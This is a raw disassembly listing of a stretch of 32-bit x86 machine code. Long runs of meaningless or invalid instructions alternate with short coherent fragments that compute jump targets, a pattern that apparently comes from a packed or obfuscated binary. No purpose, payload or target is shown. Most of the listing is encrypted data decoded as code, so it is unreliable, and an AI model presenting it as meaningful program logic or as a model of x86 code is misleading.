  4028e1:	ja     0x4028d5
  4028e3:	fnsave [ebx+0x14]
  4028e6:	ror    DWORD PTR [ecx+eax*1],cl
  4028e9:	scas   eax,DWORD PTR es:[edi]
  4028ea:	push   edx
  4028eb:	add    dh,0x31
  4028ee:	add    eax,0x4aa1f7a3
  4028f3:	pusha  
  4028f4:	shl    DWORD PTR [eax+0xc],cl
  4028f7:	test   al,0x86
  4028f9:	idiv   DWORD PTR [ebx+0x78e1d5a7]
  4028ff:	out    0x11,al
  402901:	sbb    BYTE PTR [ebx+0x19],0xc1
  402905:	icebp  
  402906:	mov    DWORD PTR [edi+0x4d],edi
  402909:	adc    al,0xce
  40290b:	dec    eax
  40290c:	jmp    0x68b9b634
  402911:	pop    eax
  402912:	(bad)  
  402913:	adc    eax,esi
  402915:	inc    ebx
  402916:	sahf   
  402917:	and    al,0x9f
  402919:	outs   dx,DWORD PTR ds:[esi]
  40291a:	dec    esi
  40291b:	test   DWORD PTR [edx-0x34],0xe678d7ec
  402922:	gs ret 0x476e
  402926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402927:	push   ebx
  402928:	fsubr  DWORD PTR [edi]
  40292a:	imul   eax,DWORD PTR [edx],0x464652e6
  402930:	pop    edi
  402931:	xchg   esp,eax
  402932:	(bad)  
  402933:	cdq    
  402934:	retf   
  402935:	mov    ds:0xfe4352a2,al
  40293a:	inc    esp
  40293b:	repnz imul eax,DWORD PTR [edx+0x52abb213],0xe859b4c4
  402946:	mov    ds:0x2e493223,al
  40294b:	push   ss
  40294c:	(bad)
  40294f:	inc    ebp
  402950:	adc    al,0x5e
  402952:	mov    esp,0xf85ee4b0
  402957:	(bad)  
  402958:	push   esi
  402959:	sub    BYTE PTR [edi+eax*1+0x2],ch
  40295d:	dec    esp
  40295e:	pop    edx
  40295f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402960:	sbb    DWORD PTR [eax-0x30],esi
  402963:	mov    BYTE PTR [ebx+0x74],dh
  402966:	es pop edx
  402968:	in     eax,dx
  402969:	mov    ch,0x3d
  40296b:	stos   BYTE PTR es:[edi],al
  40296c:	inc    edx
  40296e:	jbe    0x402905
  402970:	test   eax,ecx
  402972:	sahf   
  402973:	xlat   BYTE PTR ds:[ebx]
  402974:	ret    
  402975:	mov    esi,0x2e4bde03
  40297a:	int    0xb1
  40297c:	or     al,0x16
  40297e:	sub    eax,0x67b3a96e
  402983:	inc    ebp
  402984:	push   ds
  402985:	inc    edi
  402986:	cmp    al,BYTE PTR [ebp+0x5fcf41a5]
  40298c:	out    0x6a,al
  40298e:	mov    al,ds:0x47641f98
  402993:	out    0xdd,al
  402995:	lods   eax,DWORD PTR ds:[esi]
  402996:	and    ebp,DWORD PTR [eax+0x26]
  402999:	int    0x43
  40299b:	pop    esi
  40299c:	push   es
  40299d:	aad    0x6e
  40299f:	mov    ecx,0xe6ebb878
  4029a4:	ja     0x402a24
  4029a6:	leave  
  4029a7:	mov    ss,ebp
  4029a9:	fisubr DWORD PTR [esi]
  4029ab:	scas   al,BYTE PTR es:[edi]
  4029ac:	sar    ebp,0xf3
  4029af:	mov    eax,ds:0x2c37d197
  4029b4:	std    
  4029b5:	ret    
  4029b6:	nop
  4029b7:	sbb    edi,DWORD PTR [esi-0x1b]
  4029ba:	and    edx,DWORD PTR [ecx-0x771bad2c]
  4029c0:	pusha  
  4029c1:	cdq    
  4029c2:	mov    eax,0xdd7ad254
  4029c7:	xchg   edx,eax
  4029c8:	les    ebp,FWORD PTR [esi-0x1e827226]
  4029ce:	lods   al,BYTE PTR ds:[esi]
  4029cf:	mov    ecx,0x206bfdd0
  4029d4:	cwde   
  4029d5:	xchg   ebx,eax
  4029d6:	dec    eax
  4029d7:	(bad)  
  4029d8:	sbb    BYTE PTR [edx-0x1fc09d16],bl
  4029de:	(bad)  
  4029e0:	scas   al,BYTE PTR es:[edi]
  4029e1:	or     edx,esp
  4029e3:	xor    esp,DWORD PTR [edx+ebp*8+0x5e]
  4029e7:	xchg   ecx,eax
  4029e8:	cli    
  4029e9:	and    eax,esi
  4029eb:	pop    edx
  4029ec:	mov    dh,0x74
  4029ee:	aas    
  4029ef:	mov    al,ds:0x5600a1b
  4029f4:	jmp    0x865942fe
  4029f9:	(bad)  
  4029fa:	in     al,0xe2
  4029fc:	jae    0x402a05
  4029fe:	test   al,0xe2
  402a00:	add    esi,DWORD PTR [ebx]
  402a02:	and    ah,BYTE PTR [eax-0x4cc1ea7b]
  402a08:	popa   
  402a09:	cs call 0x69a6eb7e
  402a0f:	ss jnp 0x4029bb
  402a12:	push   ebp
  402a13:	mov    eax,DWORD PTR [ebp-0x2c]
  402a16:	jne    0x402a1f
  402a1c:	mov    eax,DWORD PTR [ebp-0x10]
  402a1f:	xor    eax,esi
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	icebp  
  402a35:	mov    eax,ds:0xdaa64ef
  402a3a:	jle    0x402aba
  402a3c:	cli    
  402a3d:	jg     0x402abd
  402a3f:	jle    0x4029cd
  402a41:	shl    DWORD PTR [edx-0x48],1
  402a44:	retf   0x533f
  402a47:	fist   DWORD PTR [ecx-0x2]
  402a4a:	pop    ds
  402a4b:	cmc    
  402a4c:	mov    al,0xe7
  402a4e:	dec    edi
  402a4f:	jmp    ebp
  402a51:	jns    0x402a33
  402a53:	mov    eax,DWORD PTR [ebx]
  402a55:	outs   dx,BYTE PTR ds:[esi]
  402a56:	pop    edi
  402a57:	sbb    DWORD PTR [ebp+0x4a],edi
  402a5a:	xchg   ebp,eax
  402a5b:	add    al,0xa5
  402a5d:	out    0x23,al
  402a5f:	push   es
  402a60:	adc    dl,BYTE PTR ss:[ebp-0x16feea9d]
  402a67:	add    esi,DWORD PTR [ebx]
  402a69:	lock jno 0x402a83
  402a6c:	jb     0x402a10
  402a6e:	cmp    al,0xe1
  402a70:	or     eax,0x90852fcc
  402a75:	xchg   esp,eax
  402a76:	test   eax,0x25e99df0
  402a7b:	sub    eax,0x75fad331
  402a80:	or     ah,bl
  402a82:	or     ebp,DWORD PTR [esi-0x12]
  402a85:	inc    eax
  402a86:	aas    
  402a87:	pusha  
  402a88:	mov    DWORD PTR [esi+0x63],esp
  402a8b:	sbb    al,0x6d
  402a8d:	shl    DWORD PTR [edx-0x43],1
  402a90:	xchg   ecx,eax
  402a91:	pop    ecx
  402a92:	inc    esi
  402a93:	test   eax,0x48c41e3e
  402a98:	xchg   ebx,eax
  402a99:	(bad)  
  402a9a:	fcom   st(7)
  402a9c:	or     BYTE PTR [edx*1-0x4802de12],al
  402aa3:	in     al,0xa1
  402aa5:	cmp    eax,0xd00e9417
  402aaa:	sahf   
  402aab:	fcomi  st,st(7)
  402aad:	jns    0x402a9d
  402aaf:	mov    ds:0xa4cd9a56,al
  402ab4:	push   esp
  402ab5:	mov    ebp,0x46cbad0a
  402aba:	sub    ah,dl
  402abc:	push   ss
  402abd:	ret    
  402abe:	js     0x402b00
  402ac0:	mov    eax,ds:0x9a371d65
  402ac5:	int    0x14
  402ac7:	and    BYTE PTR [edx],ah
  402ac9:	jbe    0x402a8b
  402acb:	(bad)  
  402acc:	jp     0x402a57
  402ace:	mov    esp,0x8fa0b0f8
  402ad3:	out    dx,al
  402ad4:	imul   ebp,DWORD PTR [esi+0x59ef21d0],0x34
  402adb:	lea    ecx,[ecx+0x78236afa]
  402ae1:	fist   WORD PTR [edx-0x1c]
  402ae4:	push   edx
  402ae5:	jns    0x402b45
  402ae7:	cmc    
  402ae8:	outs   dx,BYTE PTR ds:[esi]
  402ae9:	(bad)  
  402aea:	in     eax,0x8
  402aec:	xor    DWORD PTR [esi],ebp
  402aee:	gs loopne 0x402ab4
  402af1:	add    edi,DWORD PTR [edi-0x496f8af]
  402af7:	popf   
  402af8:	ins    DWORD PTR es:[edi],dx
  402af9:	xchg   edi,eax
  402afa:	imul   dl
  402afc:	js     0x402aaf
  402afe:	inc    esi
  402aff:	xor    ch,dl
  402b01:	scas   eax,DWORD PTR es:[edi]
  402b02:	std    
  402b03:	mov    ah,0x2b
  402b05:	leave  
  402b06:	adc    BYTE PTR [ebx-0x1c],dl
  402b09:	pusha  
  402b0a:	fstp   TBYTE PTR [eax]
  402b0c:	mov    edi,0xe60d92a4
  402b11:	xor    ch,dl
  402b13:	inc    ebp
  402b14:	pop    edx
  402b15:	imul   esi,DWORD PTR [esi-0xaea71ca],0xf2b1b5cf
  402b1f:	retf   0x6464
  402b22:	add    dl,BYTE PTR [eax+0x2dea1649]
  402b28:	jne    0x402b3e
  402b2a:	jge    0x402b59
  402b2c:	add    al,0x22
  402b2e:	and    esp,DWORD PTR [esi-0x11]
  402b31:	out    dx,eax
  402b32:	wrmsr  
  402b34:	or     ebx,DWORD PTR [edx+ecx*1-0x5b813450]
  402b3b:	cdq    
  402b3c:	inc    esi
  402b3d:	xor    ah,BYTE PTR [ebp+0x15b82272]
  402b43:	mov    bl,0xc1
  402b45:	jmp    0x7d7e1d2e
  402b4a:	std    
  402b4b:	xchg   esp,eax
  402b4c:	popf   
  402b4d:	fidivr WORD PTR [ebx-0x4f]
  402b50:	cmp    DWORD PTR [edx],eax
  402b52:	push   edx
  402b53:	(bad)  
  402b55:	retf   
  402b56:	aam    0x42
  402b58:	das    
  402b59:	stos   DWORD PTR es:[edi],eax
  402b5a:	cmp    dl,0x45
  402b5d:	jg     0x402b1b
  402b5f:	std    
  402b60:	xor    DWORD PTR [ecx+0x5d90b320],ecx
  402b66:	leave  
  402b67:	or     bl,BYTE PTR [ebx]
  402b69:	cli    
  402b6a:	xor    al,BYTE PTR [edi+0x54]
  402b6d:	sub    al,0x7f
  402b6f:	pop    esp
  402b70:	rcl    BYTE PTR [esi],1
  402b72:	aaa    
  402b73:	inc    edi
  402b74:	rcl    BYTE PTR [esi],cl
  402b76:	sar    esi,1
  402b78:	jns    0x402afb
  402b7a:	or     ah,BYTE PTR [edi-0x42]
  402b7d:	push   esp
  402b7e:	shr    BYTE PTR [ebx+0x3ef02e7c],1
  402b84:	push   cs
  402b85:	jae    0x402be7
  402b87:	(bad)  
  402b89:	jecxz  0x402bcc
  402b8b:	mov    ebx,0x7b8eb812
  402b90:	repz cmp BYTE PTR [eax+eiz*2+0x7f2c5385],cl
  402b98:	fwait
  402b99:	sbb    al,BYTE PTR [edi-0x371534e1]
  402b9f:	dec    edi
  402ba0:	aaa    
  402ba1:	mov    ecx,0xf1f778a8
  402ba6:	mov    ah,0x34
  402ba8:	sub    DWORD PTR [edx],0x7ca30715
  402bae:	and    DWORD PTR [ecx+edi*4-0x2e],eax
  402bb2:	in     eax,dx
  402bb3:	imul   esp,DWORD PTR [edx+0x10],0x175472b5
  402bba:	sub    BYTE PTR [ecx],al
  402bbc:	push   ds
  402bbd:	(bad)  
  402bbe:	jp     0x402c07
  402bc0:	test   al,0xa1
  402bc2:	fld    DWORD PTR [eax-0x7b]
  402bc5:	ror    BYTE PTR [edi],0x84
  402bc8:	sub    BYTE PTR [eax],al
  402bca:	add    BYTE PTR [eax],al
  402bcc:	lea    eax,[ebp-0x98]
  402bd2:	push   eax
  402bd3:	mov    eax,DWORD PTR [ebp-0x1c]
  402bd6:	xor    eax,esi
  402bd8:	add    eax,edi
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	xchg   BYTE PTR [edi+0xb366291],bh
  402c17:	jle    0x402c97
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402c72
  402c1e:	inc    esi
  402c1f:	dec    ebx
  402c20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c21:	mov    esi,esp
  402c23:	mov    dh,0x46
  402c25:	hlt    
  402c26:	inc    esp
  402c27:	outs   dx,DWORD PTR ds:[esi]
  402c28:	in     eax,dx
  402c29:	ins    BYTE PTR es:[edi],dx
  402c2a:	loop   0x402c02
  402c2c:	jmp    0x281b:0xc328b369
  402c33:	test   BYTE PTR [ebp-0x67254cd9],cl
  402c39:	dec    eax
  402c3a:	sbb    eax,0x5134bbaa
  402c3f:	fmul   QWORD PTR [edx]
  402c41:	xor    ecx,DWORD PTR [ecx+0x4b]
  402c44:	sbb    edx,esi
  402c46:	fwait
  402c47:	gs rol ah,1
  402c4a:	mov    esi,0x9c6dd05d
  402c4f:	sub    al,BYTE PTR [esi-0x3c]
  402c52:	loopne 0x402cd1
  402c54:	mov    ecx,0x33e9c188
  402c59:	pop    eax
  402c5a:	int3   
  402c5b:	dec    esp
  402c5c:	ds or  eax,0xcdd2f03
  402c62:	cmp    esp,DWORD PTR [esi+0x286ea101]
  402c68:	gs add eax,0x451e7436
  402c6e:	mov    eax,ds:0x2bd2b9
  402c73:	fisttp DWORD PTR [ebp+0x4d]
  402c76:	push   ebp
  402c77:	in     al,0x42
  402c79:	ja     0x402c2e
  402c7b:	cmp    BYTE PTR [eax+0x7e1cfd76],bh
  402c81:	inc    esi
  402c82:	mov    eax,0xfde6edc6
  402c87:	jmp    0x402c84
  402c89:	jb     0x402c46
  402c8b:	mov    ebx,0x46f7027e
  402c90:	inc    eax
  402c91:	stos   BYTE PTR es:[edi],al
  402c92:	push   ecx
  402c93:	pop    esi
  402c94:	mov    esi,0x2063608c
  402c99:	jecxz  0x402cbd
  402c9b:	or     esp,esi
  402c9d:	mov    al,ds:0x8c9a24d
  402ca2:	cmp    al,bl
  402ca4:	leave  
  402ca5:	or     BYTE PTR [edx-0x6f],cl
  402ca8:	mov    dh,0x12
  402caa:	adc    BYTE PTR [ecx],dh
  402cac:	fild   WORD PTR [esi+0x76655dfe]
  402cb2:	add    al,0xa3
  402cb4:	or     dh,BYTE PTR [ecx]
  402cb6:	mov    bl,0x2a
  402cb8:	inc    ebp
  402cb9:	nop
  402cba:	sub    DWORD PTR [edx+0x49006f2e],esp
  402cc0:	add    eax,0xafabcba2
  402cc5:	mov    ecx,ebp
  402cc7:	push   ds
  402cc8:	mov    dh,0x3c
  402cca:	pusha  
  402ccb:	adc    al,ah
  402ccd:	mov    ds:0xd429b4a8,eax
  402cd2:	int    0x8a
  402cd4:	cmp    DWORD PTR [edi+0x24aadcdf],ecx
  402cda:	jp     0x402c9e
  402cdc:	arpl   WORD PTR [ecx+0x2b],sp
  402cdf:	mov    ds:0xabdb562e,eax
  402ce4:	js     0x402d05
  402ce6:	adc    al,0x83
  402ce8:	not    DWORD PTR [ebx-0x5d22724]
  402cee:	mov    ds:0x70d8beb7,eax
  402cf3:	ret    0x3856
  402cf6:	mov    dh,0x27
  402cf8:	cmp    al,0x93
  402cfa:	fdiv   QWORD PTR [eax-0x39]
  402cfd:	rcl    dl,cl
  402cff:	push   ss
  402d00:	or     ebx,esi
  402d02:	scas   al,BYTE PTR es:[edi]
  402d03:	push   esp
  402d04:	imul   edi,DWORD PTR [ecx-0x29],0xaa643f4a
  402d0b:	jb     0x402cc1
  402d0d:	sahf   
  402d0e:	hlt    
  402d0f:	sahf   
  402d10:	out    0x41,eax
  402d12:	aam    0x67
  402d14:	out    dx,al
  402d15:	pop    eax
  402d16:	shl    sp,1
  402d19:	ss mov ecx,0x65bc4f63
  402d1f:	es inc esi
  402d21:	mov    BYTE PTR [ebx+0xd],cl
  402d24:	mov    ebp,0xe17a1628
  402d29:	std    
  402d2a:	jecxz  0x402d99
  402d2c:	fdivp  st(5),st
  402d2e:	fimul  WORD PTR [edi]
  402d30:	pop    esi
  402d31:	stos   BYTE PTR es:[edi],al
  402d32:	xchg   ecx,eax
  402d33:	aaa    
  402d34:	dec    ebx
  402d35:	call   0xdc1c8183
  402d3a:	jne    0x402ce7
  402d3c:	push   0x230cd068
  402d41:	iret   
  402d42:	rcr    DWORD PTR [esi+0x3e9640d4],cl
  402d48:	jne    0x402d33
  402d4a:	shr    BYTE PTR [esi+0x77],1
  402d4d:	rcl    DWORD PTR [edi+0x81355d8],0x66
  402d54:	xchg   ebp,eax
  402d55:	jle    0x402da3
  402d57:	sahf   
  402d58:	(bad)  
  402d59:	in     eax,0xcb
  402d5b:	mov    bh,0x19
  402d5d:	inc    eax
  402d5e:	pop    esp
  402d5f:	or     eax,DWORD PTR [esp+edi*4]
  402d62:	sub    al,0x8c
  402d64:	mov    al,ds:0x3a2ac298
  402d69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d6a:	sbb    ecx,DWORD PTR [ecx+0x2c2aef42]
  402d70:	fnstcw WORD PTR [ebp-0x23ce366c]
  402d76:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  402d78:	sub    esp,DWORD PTR [eax+0x13fbfb4a]
  402d7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d7f:	stc    
  402d80:	and    ebx,DWORD PTR [edi]
  402d82:	jg     0x402de3
  402d84:	(bad)  
  402d85:	cmp    esp,edi
  402d87:	dec    esi
  402d88:	dec    ebx
  402d89:	push   ebx
  402d8a:	lahf   
  402d8b:	sbb    ebp,DWORD PTR [ecx-0x2c]
  402d8e:	aaa    
  402d8f:	popf   
  402d90:	adc    al,0x5c
  402d92:	jb     0x402d84
  402d94:	mov    ebp,0x20e5aa
  402d99:	xchg   esp,eax
  402d9a:	and    DWORD PTR [ecx],ecx
  402d9c:	call   0x48c76419
  402da1:	sub    eax,DWORD PTR [ebp-0x4]
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [ebx+ebx*4+0x45],1
  402de7:	cmp    al,0x8a
  402de9:	mov    dl,0x8
  402deb:	jle    0x402e6b
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402e07
  402df2:	leave  
  402df3:	and    cl,BYTE PTR [ebx+ebx*4+0x6f]
  402df7:	mul    BYTE PTR [edx]
  402df9:	sti    
  402dfa:	mov    ds:0x82b70dd4,al
  402dff:	sbb    DWORD PTR [esi+0x0],ecx
  402e02:	dec    ebx
  402e03:	jle    0x402e67
  402e05:	ret    
  402e06:	outs   dx,DWORD PTR ds:[esi]
  402e07:	sub    dl,ch
  402e09:	and    dl,BYTE PTR [esi+0x39]
  402e0c:	lods   eax,DWORD PTR ds:[esi]
  402e0d:	mov    ds:0x211eae25,al
  402e12:	nop
  402e13:	fild   WORD PTR [ecx]
  402e15:	or     ch,BYTE PTR [esi+ebx*8+0x4d]
  402e19:	dec    edi
  402e1a:	sbb    al,0xa4
  402e1c:	in     al,dx
  402e1d:	popa   
  402e1e:	xchg   BYTE PTR [ebp+eiz*2-0x13],bl
  402e22:	inc    eax
  402e23:	lahf   
  402e24:	cdq    
  402e25:	fadd   DWORD PTR [edi-0x5b67ca89]
  402e2b:	push   ebp
  402e2c:	or     al,0x6c
  402e2e:	mov    ebx,0x113f95ec
  402e33:	fistp  QWORD PTR [edx-0x42f4c753]
  402e39:	sbb    BYTE PTR [edx+0x6b31f09d],cl
  402e3f:	les    edx,FWORD PTR [esi-0x1e85f635]
  402e45:	mov    eax,ds:0x63b4d597
  402e4a:	ds pop es
  402e4c:	ret    
  402e4d:	mov    dh,0xe1
  402e4f:	out    0xd3,eax
  402e51:	int3   
  402e52:	pop    edx
  402e53:	clc    
  402e54:	sub    DWORD PTR [edx-0x253a1fb6],ecx
  402e5a:	xor    eax,0x7d70766
  402e5f:	xor    ebp,DWORD PTR [ebx-0x7d9ec95]
  402e65:	inc    ebp
  402e66:	sbb    esp,DWORD PTR [ecx]
  402e68:	out    0xc9,al
  402e6a:	mov    BYTE PTR [ebp-0x22],bh
  402e6d:	test   eax,0x4748ee3e
  402e72:	mov    esp,0x6f27e12a
  402e77:	dec    eax
  402e78:	pop    ebp
  402e79:	ds push ds
  402e7b:	aam    0x87
  402e7d:	repz arpl WORD PTR [ebp+0x48b8c9a4],dx
  402e84:	in     al,dx
  402e85:	call   0xdb707003
  402e8a:	push   ebx
  402e8b:	dec    esi
  402e8c:	or     ch,ah
  402e8e:	push   0x58a733f4
  402e93:	retf   
  402e94:	loop   0x402e30
  402e96:	jne    0x402e25
  402e98:	push   ebx
  402e99:	mov    BYTE PTR [ecx+eiz*2],ah
  402e9c:	pop    esp
  402e9d:	dec    edx
  402e9e:	outs   dx,BYTE PTR ds:[esi]
  402e9f:	dec    ebx
  402ea0:	ror    DWORD PTR [edi+ebx*2-0x4216b56a],cl
  402ea7:	jne    0x402e3d
  402ea9:	fst    QWORD PTR [esp+edx*1+0x6c]
  402ead:	push   ebx
  402eae:	pop    es
  402eaf:	sbb    eax,0xe74fd738
  402eb4:	arpl   bx,ax
  402eb6:	rcr    BYTE PTR [esi+edi*4-0x4b],1
  402eba:	adc    DWORD PTR [edx+ebp*8+0x17],0x3b4afd93
  402ec2:	xor    DWORD PTR [ebp+0x4cacafc8],0x59
  402ec9:	mov    cl,0xa1
  402ecb:	enter  0xaccd,0x1b
  402ecf:	cdq    
  402ed0:	sbb    cl,BYTE PTR [ebp+0x3e]
  402ed3:	jmp    0xecd2:0xdf72ef89
  402eda:	mov    ebp,0xbc881c0e
  402edf:	outs   dx,BYTE PTR ds:[esi]
  402ee0:	xchg   ebp,eax
  402ee1:	out    0x1a,al
  402ee3:	lods   eax,DWORD PTR ds:[esi]
  402ee4:	adc    BYTE PTR [edi],ch
  402ee6:	nop
  402ee7:	enter  0xc2e,0xe9
  402eeb:	sbb    ecx,edx
  402eed:	cwde   
  402eee:	pushf  
  402eef:	push   edx
  402ef0:	dec    edi
  402ef1:	sub    dh,BYTE PTR [ebx+esi*2+0x6]
  402ef5:	in     al,dx
  402ef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ef7:	jmp    FWORD PTR [edx]
  402ef9:	leave  
  402efa:	jb     0x402f6d
  402efc:	mov    bh,0x21
  402efe:	pop    esi
  402eff:	inc    ecx
  402f00:	sar    BYTE PTR [esi+0x39],1
  402f03:	loop   0x402f6e
  402f05:	dec    ecx
  402f06:	sub    al,ah
  402f08:	test   al,0x2f
  402f0a:	stos   DWORD PTR es:[edi],eax
  402f0b:	mov    DWORD PTR [esi+esi*1-0x42050922],esp
  402f12:	fdiv   DWORD PTR [ecx+edi*2+0xa4cb730]
  402f19:	push   edx
  402f1a:	test   eax,0x545c3d59
  402f1f:	mov    ch,ah
  402f21:	or     BYTE PTR [edi],al
  402f23:	xor    DWORD PTR [eax],esi
  402f25:	push   esi
  402f26:	jno    0x402f22
  402f28:	das    
  402f29:	pop    esi
  402f2a:	dec    eax
  402f2b:	xchg   DWORD PTR [eax+0x5b],ebx
  402f2e:	xchg   esi,eax
  402f2f:	pop    esi
  402f30:	arpl   WORD PTR [esi-0x8572629],sp
  402f36:	inc    DWORD PTR fs:[ebx]
  402f39:	sbb    DWORD PTR [eax+0x12aa0b1c],edi
  402f3f:	clc    
  402f40:	shl    DWORD PTR [edi-0x4e],cl
  402f43:	jle    0x402f3a
  402f45:	adc    al,0xc7
  402f47:	pop    esp
  402f48:	rol    DWORD PTR [eax],1
  402f4a:	sub    ebx,DWORD PTR [ecx-0x655a68cc]
  402f50:	mov    ah,0x7d
  402f52:	dec    ecx
  402f53:	(bad)  
  402f54:	retf   0x153b
  402f57:	dec    ecx
  402f58:	sbb    DWORD PTR [edx+0x19976b6a],ecx
  402f5e:	pop    esp
  402f5f:	dec    edi
  402f60:	or     BYTE PTR [edi+0x5f9add7],ah
  402f66:	hlt    
  402f67:	out    dx,al
  402f68:	scas   eax,DWORD PTR es:[edi]
  402f69:	jbe    0x402fda
  402f6b:	imul   ebp,DWORD PTR [ebp-0xbfdc22f],0x6e
  402f72:	mov    ah,0xd3
  402f74:	xchg   ebx,eax
  402f75:	lea    eax,ds:0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi+0x3803a5b7]
  402fae:	dec    esp
  402faf:	jmp    0x7ebe45f2
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x403017
  402fb9:	xchg   esi,eax
  402fba:	mov    eax,ds:0x2f163c96
  402fbf:	xchg   edi,eax
  402fc0:	popf   
  402fc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fc2:	in     al,0xa0
  402fc4:	push   ecx
  402fc6:	xor    esp,DWORD PTR [edi]
  402fc8:	ret    
  402fc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fca:	in     eax,dx
  402fcb:	sub    dl,BYTE PTR [eax+0x6f8621ef]
  402fd1:	cmp    eax,0x4cca693b
  402fd6:	mov    esi,0xdfd7c6cd
  402fdb:	jns    0x403023
  402fdd:	xchg   ebp,eax
  402fde:	addr16 push ebp
  402fe0:	fdiv   DWORD PTR [edx+0x6bb8f16f]
  402fe6:	test   BYTE PTR [edi+edi*1],dh
  402fe9:	jmp    DWORD PTR [ecx-0x56]
  402fec:	int3   
  402fed:	int3   
  402fee:	jmp    0x9f0e:0x31683b0d
  402ff5:	stc    
  402ff6:	pushf  
  402ff7:	dec    ebp
  402ff8:	mov    eax,ds:0xcec20280
  402ffe:	les    eax,FWORD PTR fs:[esp+ebp*8-0x2edbb66b]
  403006:	add    eax,0x3e3183fc
  40300b:	sbb    DWORD PTR [esi-0x3a],0xc5b5b49c
  403012:	dec    ebx
  403013:	stos   DWORD PTR es:[edi],eax
  403014:	push   ss
  403015:	(bad)
  403018:	fwait
  403019:	sbb    eax,0x39cd12a6
  40301e:	sub    esi,DWORD PTR [ebx-0x1ff2e904]
  403024:	sub    dl,BYTE PTR [edx+0x6b]
  403027:	xchg   BYTE PTR [edi],bh
  403029:	lds    eax,FWORD PTR [ebx-0x80]
  40302c:	mov    ds:0xcc81ba03,eax
  403031:	mov    WORD PTR [esi],?
  403033:	adc    esp,DWORD PTR [esi]
  403035:	mov    DWORD PTR [edi+0x7afc53c3],0xa02d7238
  40303f:	in     eax,0xbb
  403041:	inc    ebp
  403042:	add    DWORD PTR [esi-0x70135dbb],0xffffffd7
  403049:	outs   dx,BYTE PTR ds:[esi]
  40304a:	stc    
  40304b:	hlt    
  40304c:	(bad)
  40304f:	aad    0x50
  403051:	fist   WORD PTR [edi]
  403053:	mov    dh,0x14
  403055:	ins    BYTE PTR es:[edi],dx
  403056:	jecxz  0x402fdd
  403058:	(bad)  
  403059:	rol    al,0x82
  40305c:	cli    
  40305d:	xor    al,0x2d
  40305f:	aad    0xfe
  403061:	stos   DWORD PTR es:[edi],eax
  403062:	pop    ebp
  403063:	pop    edx
  403064:	scas   al,BYTE PTR es:[edi]
  403065:	jno    0x40303b
  403067:	dec    eax
  403068:	cmp    DWORD PTR [ecx],esp
  40306a:	or     al,0xbd
  40306c:	jae    0x4030d4
  40306e:	hlt    
  40306f:	dec    eax
  403070:	loopne 0x40306d
  403072:	bound  ebx,QWORD PTR [esi+0x28]
  403075:	test   DWORD PTR [ebx-0x62],edi
  403078:	fdiv   DWORD PTR [edi-0xdf39a30]
  40307e:	bound  ecx,QWORD PTR [edi-0xf]
  403081:	add    edx,DWORD PTR [edi+0x7e]
  403084:	jae    0x4030c1
  403086:	add    BYTE PTR [esi],al
  403088:	push   ecx
  403089:	dec    ecx
  40308a:	adc    edi,DWORD PTR [edi+0x25]
  40308d:	ja     0x403103
  40308f:	sahf   
  403090:	add    eax,0x55c81c9c
  403095:	inc    ecx
  403096:	cmp    DWORD PTR [edx+0x2999e592],ecx
  40309c:	dec    eax
